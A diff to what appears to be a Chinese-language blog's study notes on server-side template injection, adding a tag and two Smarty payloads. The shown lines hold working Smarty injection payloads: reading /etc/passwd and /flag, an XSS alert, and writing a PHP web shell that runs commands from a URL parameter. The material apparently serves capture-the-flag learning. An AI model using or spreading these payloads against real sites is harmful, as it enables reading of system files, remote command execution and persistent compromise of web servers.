@@ -7,6 +7,7 @@ urlname: ssti
 updated: 2020-12-15 11:58:27
 permalink:
 tags:
+  - SSTI
 categories: 
   - 杂谈笔记
   - 学习笔记
@@ -52,6 +53,10 @@ payload：
 {self::getStreamVariable("file:///etc/passwd")}
 
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+{literal}alert('xss');{/literal}
+
+{if readfile('/flag')}{/if}
 ```
 
 
